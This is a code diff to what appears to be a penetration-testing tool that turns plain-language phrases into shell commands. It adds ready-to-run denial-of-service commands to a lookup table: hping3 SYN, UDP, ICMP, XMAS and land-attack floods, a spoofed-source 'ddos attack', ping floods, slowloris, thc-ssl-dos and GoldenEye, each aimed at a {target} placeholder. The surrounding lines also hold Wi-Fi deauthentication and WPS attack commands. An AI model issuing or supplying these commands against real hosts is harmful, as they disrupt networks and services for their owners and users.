@@ -438,6 +438,22 @@ NATURAL_COMMANDS = {
     "sniff traffic": ("wireshark", "wireshark", "Launch Wireshark"),
     "deauth": ("aireplay-ng", "aireplay-ng -0 10 -a {bssid} {iface}mon", "Deauthentication attack"),
     "wps attack": ("reaver", "reaver -i {iface}mon -b {bssid} -vv -K 1", "WPS Pixie Dust attack"),
+    # ── Stress Testing / DoS ──
+    "syn flood": ("hping3", "hping3 -S --flood -V -p 80 {target}", "SYN flood attack"),
+    "udp flood": ("hping3", "hping3 --udp --flood -p 53 {target}", "UDP flood attack"),
+    "icmp flood": ("hping3", "hping3 --icmp --flood {target}", "ICMP flood attack"),
+    "ping flood": ("ping", "ping -f -s 65500 {target}", "Ping flood attack"),
+    "ping of death": ("ping", "ping -s 65500 -c 100 {target}", "Ping of death (oversized ICMP)"),
+    "slowloris": ("slowloris", "slowloris {target} -p 80 -s 500", "HTTP slowloris DoS"),
+    "http flood": ("slowloris", "slowloris {target} -p 80 -s 500", "HTTP connection exhaustion"),
+    "ssl dos": ("thc-ssl-dos", "thc-ssl-dos {target} 443 --accept", "SSL renegotiation DoS"),
+    "stress test": ("hping3", "hping3 -S --flood -V -p 80 {target}", "Stress test with SYN flood"),
+    "dos attack": ("hping3", "hping3 -S --flood -V -p 80 {target}", "SYN flood DoS attack"),
+    "ddos attack": ("hping3", "hping3 -S --flood --rand-source -p 80 {target}", "SYN flood with spoofed source"),
+    "christmas attack": ("hping3", "hping3 --flood -FSRPAU -p 80 {target}", "XMAS tree packet flood"),
+    "xmas attack": ("hping3", "hping3 --flood -FSRPAU -p 80 {target}", "XMAS tree packet flood"),
+    "land attack": ("hping3", "hping3 -S -a {target} -p 80 --flood {target}", "Land attack (spoofed source=target)"),
+    "goldeneye": ("goldeneye", "goldeneye http://{target} -w 50 -s 500", "GoldenEye HTTP DoS"),
 }
 
 
